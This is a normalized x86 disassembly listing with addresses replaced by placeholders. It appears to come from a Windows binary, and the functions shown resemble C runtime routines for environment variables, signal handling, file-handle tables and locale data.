push [ esi + eax * 4 ]
call sub_41a3a5
pop ecx
mov ecx [ ebp - 0x8 ]
cmp [ ebp - 0x1 ] bl
jne r-xdata
test eax eax
jne r-xdata
call j_sub_41748c
test eax eax
jne r-xdata
or ebx 0xffffffff
cmp ecx 0x3fffffff
jae r-xdata
cmp [ esi + ecx * 4 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edi ebx
mov [ esi + ecx * 4 ] eax
jmp r-xdata
push 0x4
push 0x1
call sub_41942e
push ebx
mov [ rw-data ] eax
call sub_41a3a5
add esp 0xc
push 0x4
push 0x1
call sub_41942e
push ebx
mov [ rw-data ] eax
call sub_41a3a5
add esp 0xc
cmp [ rw-data ] ebx
je r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push 0x4
push ecx
push esi
call sub_41f1d3
push ebx
mov esi eax
call sub_41a3a5
add esp 0x10
test esi esi
je r-xdata
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ esi + ecx * 4 ] eax
inc ecx
push 0x4
push ecx
push esi
call sub_41f1d3
push ebx
mov esi eax
call sub_41a3a5
add esp 0x10
mov eax edi
test esi esi
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi ebx
mov eax [ ebp + 0x8 ]
mov [ esi + ecx * 4 ] eax
mov [ esi + ecx * 4 + 0x4 ] ebx
jmp r-xdata
mov ecx eax
lea edx [ ecx + 0x2 ]
mov [ rw-data ] esi
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
sub ecx edx
sar ecx 0x1
push 0x2
lea eax [ ecx + 0x2 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_41942e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
call sub_41a3a5
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
push [ ebp - 0x8 ]
push esi
call sub_41a3df
add esp 0xc
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413b2e
int3
mov ecx [ ebp - 0xc ]
inc ecx
lea ecx [ esi + ecx * 2 ]
mov [ ecx - 0x2 ] ax
movzx eax [ ebp - 0x1 ]
neg eax
sbb eax eax
not eax
and eax ecx
push eax
push esi
call [ SetEnvironmentVariableW@IAT ]
test eax eax
jne r-xdata
call sub_41529e
or ebx 0xffffffff
mov [ eax ] 0x2a
sub_41f0b3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push ebx
xor ebx ebx
mov eax edi
mov ecx ebx
mov [ ebp - 0x4 ] ebx
push esi
cmp [ edi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ecx + 0x1 ]
push 0x4
push eax
call sub_41942e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
lea eax [ eax + 0x4 ]
inc ecx
cmp [ eax ] ebx
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
call sub_419afb
cmp [ edi ] ebx
je r-xdata
push ebx
call sub_41a3a5
pop ecx
mov eax esi
pop esi
pop ebx
mov ebx esi
sub ebx edi
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x4 ]
jne r-xdata
sub ecx edx
sar ecx 0x1
push 0x2
lea eax [ ecx + 0x1 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_41942e
mov [ ebx + edi ] eax
xor eax eax
push eax
call sub_41a3a5
add esp 0xc
cmp [ ebx + edi ] 0x0
je r-xdata
push [ edi ]
push [ ebp - 0x8 ]
push [ ebx + edi ]
call sub_41a3df
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
add edi 0x4
cmp [ edi ] eax
jne r-xdata
mov ecx [ edi ]
lea edx [ ecx + 0x2 ]
xor ebx ebx
sub_41f171
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
mov esi edi
cmp [ edi ] 0x0
je r-xdata
sub esi edi
sar esi 0x2
neg esi
mov ebx [ ebp + 0xc ]
add esi 0x4
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
movzx eax [ eax + ebx * 2 ]
cmp eax 0x3d
je r-xdata
push ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_4274df
add esp 0xc
test eax eax
jne r-xdata
sub esi edi
sar esi 0x2
jmp r-xdata
test ax ax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_41f1de
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
test ebx ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0x10 ]
jae r-xdata
xor edi edi
push ebx
call sub_4276dc
pop ecx
mov edi eax
jmp r-xdata
call sub_41529e
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
cmp edi esi
jae r-xdata
imul esi [ ebp + 0x10 ]
push esi
push ebx
call sub_419b8c
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
pop esi
pop ebp
retn
sub esi edi
lea eax [ ebx + edi ]
push esi
push 0x0
push eax
call sub_411230
add esp 0xc
sub_41f266
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ ebp + 0x8 ]
cmp edi [ ebp + 0xc ]
jne r-xdata
push esi
mov esi edi
push ebx
mov al 0x1
jmp r-xdata
add esi 0x8
cmp esi [ ebp + 0xc ]
jne r-xdata
mov ecx ebx
call [ r--data ]
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40d56a
mov esp ebp
pop ebp
retn
mov ebx [ esi ]
test ebx ebx
je r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
cmp esi edi
je r-xdata
mov al 0x1
jmp r-xdata
xor al al
add esi 0xfffffffc
pop ebx
pop esi
sub esi 0x8
lea eax [ esi + 0x4 ]
cmp eax edi
jne r-xdata
mov ebx [ esi ]
test ebx ebx
je r-xdata
cmp [ esi - 0x4 ] 0x0
je r-xdata
push 0x0
mov ecx ebx
call [ r--data ]
call ebx
pop ecx
sub_41f2e9
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0xc ]
cmp [ ebp + 0x8 ] esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
add esi 0xfffffffc
push edi
sub esi 0x8
lea eax [ esi + 0x4 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
mov ecx edi
call [ r--data ]
call edi
pop ecx
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_41f336
push 0xc
push r--data
call sub_40e2a0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ rw-data ]
ror esi cl
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41f384
mov eax esi
call sub_40e2e6
retn 0xc
sub_41f390
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41f336
mov esp ebp
pop ebp
retn
sub_41f3b8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
sub eax 0x1
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x9
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x6
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x1
je r-xdata
xor eax eax
pop ebp
retn
sub_41f3fa
mov edi edi
push ebp
mov ebp esp
imul ecx [ r--data ] 0xc
mov eax [ ebp + 0xc ]
add ecx eax
cmp eax ecx
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
pop ebp
retn
add eax 0xc
cmp eax ecx
jne r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
sub_41f422
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
push eax
push 0x3
call sub_41f390
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_41f439
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_424e86
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_424e86
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_424e86
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_424e86
pop ebp
retn
sub_41f47d
push 0x2c
push r--data
call sub_429a90
xor ebx ebx
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x34 ] ebx
mov cl 0x1
mov [ ebp - 0x1d ] cl
mov esi [ ebp + 0x8 ]
push 0x8
pop edi
cmp esi edi
jg r-xdata
cmp esi 0xb
je r-xdata
je r-xdata
call sub_41ab17
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
jne r-xdata
cmp esi 0xf
je r-xdata
lea eax [ esi - 0x1 ]
sub eax 0x1
je r-xdata
push [ ebx ]
push esi
call sub_41f3fa
pop ecx
pop ecx
xor ecx ecx
test eax eax
setne cl
test ecx ecx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
call sub_41f3b8
add esp 0x4
jmp r-xdata
cmp esi 0x14
jle r-xdata
dec eax
sub eax 0x1
je r-xdata
add eax 0x8
xor cl cl
mov [ ebp - 0x1d ] cl
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
jmp r-xdata
call sub_429ad9
retn
mov [ ebp - 0x28 ] eax
and [ ebp - 0x30 ] 0x0
test cl cl
je r-xdata
cmp esi 0x16
jg r-xdata
dec eax
sub eax 0x1
jne r-xdata
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x1e ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x28 ]
test cl cl
je r-xdata
push 0x3
call sub_4191c3
pop ecx
mov cl [ ebp - 0x1d ]
jmp r-xdata
mov edx [ eax ]
mov edx [ rw-data ]
mov ecx edx
and ecx 0x1f
xor edx [ eax ]
ror edx cl
mov cl [ ebp - 0x1d ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41f63d
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
test eax eax
jne r-xdata
mov eax edx
mov [ ebp - 0x24 ] eax
xor edx edx
cmp eax 0x1
sete dl
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x1e ] dl
test dl dl
jne r-xdata
xor eax eax
cmp esi edi
jne r-xdata
cmp esi edi
je r-xdata
test cl cl
je r-xdata
push esi
mov ecx [ ebp - 0x24 ]
call [ r--data ]
call [ ebp - 0x24 ]
call sub_41aa93
push [ eax + 0x8 ]
push edi
mov ecx [ ebp - 0x24 ]
call [ r--data ]
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
and [ ebx + 0x4 ] 0x0
cmp esi edi
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x3
call sub_4151bc
push 0x3
call sub_41920b
pop ecx
mov eax [ ebp - 0x30 ]
mov [ ebx + 0x4 ] eax
cmp esi edi
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi edi
je r-xdata
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov ecx [ ebp - 0x28 ]
mov [ ecx ] eax
call sub_41f474
mov eax [ eax ]
mov [ ebp - 0x34 ] eax
call sub_41f474
mov [ eax ] 0x8c
cmp esi 0x4
jne r-xdata
call sub_41aa93
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8 ] ecx
cmp esi 0x4
jne r-xdata
imul eax [ r--data ] 0xc
add eax [ ebx ]
imul ecx [ r--data ] 0xc
add ecx eax
cmp esi edi
jne r-xdata
and [ eax + 0x8 ] 0x0
add eax 0xc
jmp r-xdata
mov [ ebp - 0x3c ] eax
cmp eax ecx
je r-xdata
sub_41f685
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_41529e
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov edx edi
xor esi esi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add edx 0x2
sub ecx 0x1
jne r-xdata
sub ebx edx
cmp [ edx ] si
je r-xdata
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov [ edi ] ax
call sub_41529e
push 0x22
jmp r-xdata
movzx eax [ ebx + edx ]
mov [ edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_413b01
sub_41f6fa
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_41529e
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
sub esi ecx
mov ebx eax
push edi
mov edi ecx
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
movzx eax [ esi + edi ]
mov [ edi ] ax
lea edi [ edi + 0x2 ]
test ax ax
je r-xdata
movzx eax [ esi + edi ]
mov [ edi ] ax
lea edi [ edi + 0x2 ]
test ax ax
je r-xdata
test edx edx
mov edx [ ebp + 0x14 ]
jne r-xdata
sub ebx 0x1
je r-xdata
pop edi
test ebx ebx
pop ebx
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] ax
sub edx 0x1
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
jmp r-xdata
xor eax eax
mov [ ecx ] ax
call sub_41529e
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
sub_41f7d2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
push 0x30
push 0x40
call sub_41942e
mov edi eax
xor ebx ebx
mov [ ebp - 0x8 ] edi
pop ecx
pop ecx
test edi edi
jne r-xdata
lea eax [ edi + 0xc00 ]
cmp edi eax
je r-xdata
mov edi ebx
jmp r-xdata
push ebx
call sub_41a3a5
pop ecx
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ edi + 0x20 ]
mov edi eax
push ebx
push 0xfa0
lea eax [ esi - 0x20 ]
push eax
call sub_41c164
or [ esi - 0x8 ] 0xffffffff
mov [ esi ] ebx
lea esi [ esi + 0x30 ]
mov [ esi - 0x2c ] ebx
lea eax [ esi - 0x20 ]
mov [ esi - 0x28 ] 0xa0a0000
mov [ esi - 0x24 ] 0xa
and [ esi - 0x23 ] 0xf8
mov [ esi - 0x22 ] bl
cmp eax edi
jne r-xdata
mov edi [ ebp - 0x8 ]
pop esi
sub_41f84c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push ebx
lea ebx [ esi + 0xc00 ]
push edi
mov edi esi
cmp esi ebx
je r-xdata
push esi
call sub_41a3a5
pop ecx
pop edi
pop ebx
push edi
call [ DeleteCriticalSection@IAT ]
add edi 0x30
cmp edi ebx
jne r-xdata
sub_41f881
push 0x14
push r--data
call sub_40e2a0
cmp [ ebp + 0x8 ] 0x2000
sbb eax eax
neg eax
jne r-xdata
xor esi esi
mov [ ebp - 0x1c ] esi
push 0x7
call sub_4191c3
pop ecx
mov [ ebp - 0x4 ] esi
mov edi esi
mov eax [ rw-data ]
call sub_41529e
push 0x9
pop esi
mov [ eax ] esi
call sub_413b01
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41f910
jmp r-xdata
cmp [ edi * 4 + rw-data ] esi
jne r-xdata
mov eax esi
call sub_40e2e6
retn
inc edi
jmp r-xdata
call sub_41f7d2
mov [ edi * 4 + rw-data ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x20 ] edi
cmp [ ebp + 0x8 ] eax
jl r-xdata
mov eax [ rw-data ]
add eax 0x40
mov [ rw-data ] eax
push 0xc
pop esi
mov [ ebp - 0x1c ] esi
sub_41f919
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_41f93c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_41529e
mov [ eax ] 0x9
call sub_41528b
and [ eax ] 0x0
or eax 0xffffffff
cmp esi [ rw-data ]
jae r-xdata
mov eax esi
mov ebx esi
and eax 0x3f
sar ebx 0x6
imul ecx eax 0x30
mov eax [ ebx * 4 + rw-data ]
mov [ ebp - 0x4 ] ecx
cmp [ ecx + eax + 0x18 ] 0xffffffff
jne r-xdata
push edi
call sub_417c78
mov edi [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax + 0x18 ] edi
xor eax eax
pop edi
jmp r-xdata
sub esi 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
push 0xfffffff6
sub esi 0x1
je r-xdata
push edi
push 0xfffffff5
jmp r-xdata
sub esi 0x1
jne r-xdata
call [ SetStdHandle@IAT ]
push edi
push 0xfffffff4
jmp r-xdata
sub_41f9d0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_41f9f3
push 0x1c
push r--data
call sub_40e2a0
push 0x7
call sub_4191c3
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41fafc
mov eax edi
call sub_40e2e6
retn
mov eax [ ebx * 4 + rw-data ]
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
lea ecx [ eax + 0xc00 ]
mov [ ebp - 0x20 ] ecx
mov esi eax
push 0x30
pop eax
call sub_41f7d2
mov [ ebx * 4 + rw-data ] eax
test eax eax
je r-xdata
inc ebx
jmp r-xdata
test [ esi + 0x28 ] 0x1
jne r-xdata
add [ rw-data ] 0x40
mov edi ebx
shl edi 0x6
push edi
call sub_41f919
pop ecx
mov edx edi
sar edx 0x6
mov eax edi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov [ eax + ecx + 0x28 ] 0x1
mov [ ebp - 0x2c ] ebx
cmp ebx 0x80
jge r-xdata
add esi eax
jmp r-xdata
push esi
call [ EnterCriticalSection@IAT ]
test [ esi + 0x28 ] 0x1
je r-xdata
mov [ ebp - 0x24 ] esi
cmp esi ecx
je r-xdata
sub esi [ ebp - 0x28 ]
mov eax esi
cdq
push 0x30
pop ecx
idiv ecx
shl ebx 0x6
lea esi [ ebx + eax ]
mov edx esi
sar edx 0x6
mov ecx esi
and ecx 0x3f
imul ecx ecx 0x30
mov eax [ edx * 4 + rw-data ]
mov [ ecx + eax + 0x28 ] 0x1
mov eax [ edx * 4 + rw-data ]
mov [ ecx + eax + 0x18 ] edi
mov edi esi
jmp r-xdata
push esi
call [ LeaveCriticalSection@IAT ]
mov ecx [ ebp - 0x20 ]
push 0x30
pop eax
mov [ ebp - 0x1c ] edi
sub_41fb05
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
js r-xdata
call sub_41529e
mov [ eax ] 0x9
call sub_41528b
and [ eax ] 0x0
or eax 0xffffffff
cmp esi [ rw-data ]
jae r-xdata
mov eax esi
mov edi esi
and eax 0x3f
sar edi 0x6
imul ebx eax 0x30
mov eax [ edi * 4 + rw-data ]
test [ ebx + eax + 0x28 ] 0x1
je r-xdata
cmp [ ebx + eax + 0x18 ] 0xffffffff
je r-xdata
call sub_417c78
cmp eax 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ ebx + eax + 0x18 ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub esi eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
push 0xfffffff6
sub esi 0x1
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
sub esi 0x1
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_41fb96
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
jmp r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
call sub_413b01
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
mov eax [ eax + ecx + 0x18 ]
pop ebp
retn
sub_41fc00
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
push eax
call sub_41a3a5
pop ecx
sub_41fcfe
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ecx
cmp [ ebx + 0xac ] ecx
jne r-xdata
push 0x50
push 0x1
call sub_41942e
mov esi eax
push 0x0
mov [ ebp - 0x4 ] esi
call sub_41a3a5
add esp 0xc
test esi esi
jne r-xdata
cmp [ ebx + 0xb0 ] ecx
jne r-xdata
push 0x4
push 0x1
call sub_41942e
mov edi eax
push 0x0
mov [ ebp - 0x8 ] edi
call sub_41a3a5
add esp 0xc
test edi edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov edi ecx
mov [ ebp - 0x8 ] ecx
mov esi rw-data
jmp r-xdata
cmp [ ebx + 0xac ] 0x0
je r-xdata
push esi
call sub_41a3a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x84 ]
test eax eax
je r-xdata
mov edi [ ebp - 0x4 ]
mov esi rw-data
push 0x14
pop ecx
[ edi ] [ esi ]
push 0x4
push 0x1
call sub_41942e
mov edi eax
push 0x0
mov [ ebp - 0xc ] edi
call sub_41a3a5
add esp 0xc
test edi edi
jne r-xdata
mov ecx [ ebx + 0x7c ]
test ecx ecx
je r-xdata
[ eax ]
mov [ edi ] ecx
mov edi [ ebx + 0xac ]
lea eax [ esi + 0xc ]
push eax
push 0x15
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_422afe
mov ecx [ ebp - 0x4 ]
mov esi eax
add ecx 0x10
lea eax [ ebp - 0x18 ]
push ecx
push 0x14
push edi
push 0x1
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x14
push eax
push 0x16
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x18
push eax
push 0x17
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_422afe
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x1c
mov [ ebp - 0x10 ] eax
push eax
push 0x18
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x20
push eax
push 0x50
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x24
push eax
push 0x51
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
push 0x1a
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_422afe
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x29
push eax
push 0x19
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2a
push eax
push 0x54
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2b
push eax
push 0x55
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2c
push eax
push 0x56
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_422afe
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2d
push eax
push 0x57
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2e
push eax
push 0x52
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2f
push eax
push 0x53
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x38
push eax
push 0x15
push edi
push 0x2
lea eax [ ebp - 0x18 ]
push eax
call sub_422afe
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x3c
push eax
push 0x14
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x40
push eax
push 0x16
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x44
push eax
push 0x17
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x48
push eax
push 0x50
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_422afe
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x4c
push eax
push 0x51
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_422afe
add esp 0x14
or eax esi
je r-xdata
push esi
call sub_41a3a5
mov eax [ ebp - 0x8 ]
push eax
call sub_41a3a5
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x7c ] eax
xor eax eax
mov [ ebx + 0x84 ] edi
mov [ ebx + 0x88 ] esi
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
mov edx [ ebp - 0x10 ]
mov edx [ edx ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
push ebx
